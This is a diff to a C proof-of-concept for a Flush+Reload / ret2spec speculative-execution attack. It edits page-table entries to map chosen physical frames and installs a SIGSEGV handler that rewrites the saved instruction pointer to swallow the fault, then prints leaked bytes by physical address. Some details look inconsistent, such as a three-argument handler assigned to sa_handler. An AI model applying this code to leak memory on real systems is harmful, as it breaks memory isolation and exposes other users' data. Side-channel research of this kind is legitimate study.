@@ -2,10 +2,10 @@
 #include "flush_and_reload.h"
 #include "ret2spec.h"
 #include <bits/types/siginfo_t.h>
-#include <setjmp.h>
 #include <signal.h>
 #include <stdlib.h>
 #include <sys/mman.h>
+#include <ucontext.h>
 #include <unistd.h>
 
 #pragma GCC diagnostic push
@@ -14,11 +14,11 @@
 #pragma GCC diagnostic pop
 
 #include <assert.h>
-#include <stdint.h>
 
-// jmp_buf deliberate_segfault;
-//
-// static void segfault_handler() { longjmp(deliberate_segfault, 1); }
+static void segfault_handler(int signum, siginfo_t *si, void *vcontext) {
+  ucontext_t *context = (ucontext_t *)vcontext;
+  context->uc_mcontext.gregs[16] = (uint64_t)(&ret2spec_end);
+}
 
 int main(int argc, char *argv[argc]) {
   // Step 1: Create a variable
@@ -52,10 +52,10 @@ int main(int argc, char *argv[argc]) {
   ptedit_pte_set_pfn(leak, 0, pfn);
   // ptedit_pte_set_bit(leak, 0, PTEDIT_PAGE_BIT_GLOBAL);
 
-  // struct sigaction sa = {0};
-  // sigemptyset(&sa.sa_mask);
-  // sa.sa_handler = segfault_handler;
-  // sigaction(SIGSEGV, &sa, NULL);
+  struct sigaction sa = {0};
+  sa.sa_handler = segfault_handler;
+  sa.sa_flags = SA_SIGINFO;
+  sigaction(SIGSEGV, &sa, NULL);
   //
   // printf("Accessing invalid variable to bring it in TLB\n");
   // if (setjmp(deliberate_segfault)) {
@@ -80,7 +80,7 @@ int main(int argc, char *argv[argc]) {
 
     for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
       if (results[i] > 0) {
-        printf("Results PFN %lx:\t", pfn);
+        printf("Results physcial addr %lx:\t", (pfn << 12) | j);
         printf("0x%lx\t%ld\n", i, results[i]);
       }
     }
